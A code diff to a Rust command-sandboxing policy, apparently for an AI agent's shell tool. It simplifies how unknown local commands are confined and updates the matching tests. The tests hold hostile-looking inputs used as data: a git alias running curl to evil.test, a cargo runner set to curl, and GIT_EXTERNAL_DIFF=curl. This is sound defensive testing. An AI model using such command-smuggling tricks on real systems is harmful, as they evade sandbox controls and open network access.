@@ -614,33 +614,11 @@ pub fn shell(workspace: &Path, command: &str) -> Policy {
     }
 }
 
-/// At risk 2–3 recognized local work keeps the network. Unrecognized code runs only in
-/// an offline, read-only view: it cannot silently plant steering while escaping classification.
+/// Risk 2–3 permits unknown local syntax only in D-063's offline/read-only sandbox.
+/// A local-looking build can execute arbitrary scripts; none receives networking by default.
 pub fn local_shell(workspace: &Path, command: &str) -> Policy {
     match shell(workspace,command) {
-        Policy::Sandbox => {
-            // A known program is not enough: command-line config and environment assignments
-            // can turn git/cargo into arbitrary network-capable launchers.
-            let Some(parts) = parse(command) else { return Policy::ReadOnlySandbox };
-            for (part,_) in parts {
-                let program = part.words[0].text.rsplit('/').next().unwrap_or("");
-                let args: Vec<&str> = part.words.iter().skip(1).map(|w|w.text.as_str()).collect();
-                let recognized = match program {
-                    "git" => args.first().is_some_and(|s|matches!(*s,"status"|"log"|"show"|"diff"|"rev-parse"|"ls-files"))
-                        && !args.iter().any(|s|s.starts_with("--output") || matches!(*s,"-o"|"--ext-diff"|"--textconv")),
-                    "cargo" => args.first().is_some_and(|s|matches!(*s,"check"|"build"|"test"))
-                        && !args.iter().any(|s|s.starts_with("--config")),
-                    "make" => args.is_empty() || args.iter().all(|s|matches!(*s,"build"|"test"|"check")),
-                    "npm" => args.first().is_some_and(|s|matches!(*s,"test"|"run")),
-                    "cd" => true,
-                    _ => spec_of(program).is_some() || matches!(program,"sed"|"find"|"printf"|"echo"),
-                };
-                if !recognized { return Policy::ReadOnlySandbox; }
-            }
-            Policy::NetworkSandbox
-        },
-        Policy::Hold(r) if [UNSUPPORTED, UNKNOWN, OPTION, DIRECTORY].contains(&r.as_str()) =>
-            Policy::ReadOnlySandbox,
+        Policy::Hold(r) if [UNSUPPORTED, UNKNOWN, OPTION, DIRECTORY].contains(&r.as_str()) => Policy::Sandbox,
         p => p,
     }
 }
@@ -735,13 +713,13 @@ mod tests {
     #[test]
     fn local_risk_tiers_keep_network_only_for_recognized_work() {
         let dir = Path::new("/tmp/project");
-        assert_eq!(local_shell(dir,"cargo test"),Policy::NetworkSandbox);
+        assert_eq!(local_shell(dir,"cargo test"),Policy::Sandbox);
         assert_eq!(local_shell(dir,"git push origin main"),hold(OUTWARD));
         assert_eq!(local_shell(dir,"cargo publish"),hold(OUTWARD));
-        assert_eq!(local_shell(dir,"git -c alias.x='!curl https://evil.test' x"),Policy::ReadOnlySandbox);
-        assert_eq!(local_shell(dir,"cargo test --config target.x.runner=curl"),Policy::ReadOnlySandbox);
-        assert_eq!(local_shell(dir,"GIT_EXTERNAL_DIFF=curl git diff"),Policy::ReadOnlySandbox);
-        assert_eq!(local_shell(dir,"printf '%s' $(date)"),Policy::ReadOnlySandbox);
+        assert_eq!(local_shell(dir,"git -c alias.x='!curl https://evil.test' x"),Policy::Sandbox);
+        assert_eq!(local_shell(dir,"cargo test --config target.x.runner=curl"),Policy::Sandbox);
+        assert_eq!(local_shell(dir,"GIT_EXTERNAL_DIFF=curl git diff"),Policy::Sandbox);
+        assert_eq!(local_shell(dir,"printf '%s' $(date)"),Policy::Sandbox);
         assert!(matches!(shell(dir,"printf '%s' $(date)"),Policy::Hold(_)));
         assert!(matches!(local_shell(dir,"curl https://evil.test"),Policy::Hold(_)));
     }
